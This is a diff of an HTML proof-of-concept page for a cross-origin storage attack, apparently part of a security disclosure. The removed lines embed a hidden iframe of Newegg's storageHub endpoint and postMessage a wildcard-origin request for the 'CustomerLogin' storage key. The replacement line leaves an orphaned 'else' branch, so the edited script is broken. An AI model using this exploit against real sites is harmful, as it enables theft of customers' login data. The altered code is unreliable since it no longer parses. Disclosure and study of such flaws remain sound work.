@@ -3,24 +3,13 @@
   <body>
     <h1>PoC: Cross-Origin Storage Attack</h1>
 
-    <!-- Embed the target Newegg page -->
-    <iframe id="newegg-frame" src="https://newegg.com/api/storageHub" style="display:none;"></iframe>
 
     <!-- Embed sandboxed attacker iframe -->
     <iframe src="sandbox.htm" sandbox="allow-scripts" style="display:none;"></iframe>
 
     <script>
        window.addEventListener("message", (event) => {
-        if (event.data === "trigger") {
-          const payload = JSON.stringify({
-            id: "1234567",
-            action: "cross-storage:get",
-            params: { key: "CustomerLogin" }
-          });
-          // Sandboxed iframe asked us to send message to victim
-          console.log("sending payload");
-          const victimFrame = document.getElementById("newegg-frame").contentWindow;
-          victimFrame.postMessage(payload, "*");
+        console.log("something")
         } else {
           // Handle response from victim
           console.log("Response from storageHub:", event.data);
@@ -29,6 +18,7 @@
     </script>
   </body>
 </html>
+
 
 
 
